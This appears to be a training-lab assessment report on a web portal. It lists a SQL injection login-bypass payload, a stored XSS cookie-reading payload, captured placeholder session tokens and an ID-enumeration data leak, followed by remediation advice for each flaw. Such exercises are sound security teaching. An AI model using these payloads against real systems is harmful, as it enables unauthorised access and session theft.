# OMNI-PORTAL ASSESSMENT REPORT
**Operator:** **Deadline:** April 5 @ 11:59 PM 

## PHASE 1: AUTH BYPASS (SQLi)
* **Payload Used:** ' OR 1=1 --
* **Result:** Successfully bypassed login and obtained 'auth_token' cookie.

## PHASE 2: CLIENT-SIDE HIJACK (XSS)
* **Stored XSS Payload:** <script>alert(document.cookie)</script>
* **Secret Cookie Captured:** auth_token=SUPPORT_TIER_1_SECRET_TOKEN; session_id=admin_secret_99812_do_not_share

## PHASE 3: API ENUMERATION (BOLA)
* **Insecure Order ID:** 501
* **Confidential Data Leaked:** {"amount":"$15,000.00","details":"Confidential Server Lease","order_id":501}

## PHASE 4: THE REMEDIATION
* **Fix for SQLi:**Use parameterized queries/prepared statements * **Fix for XSS:** Sanitize and HTML-encode all user input before rendering it on the page
* **Fix for API BOLA:** Implement server-side authorization checks that verify the requesting user owns the order ID being requested
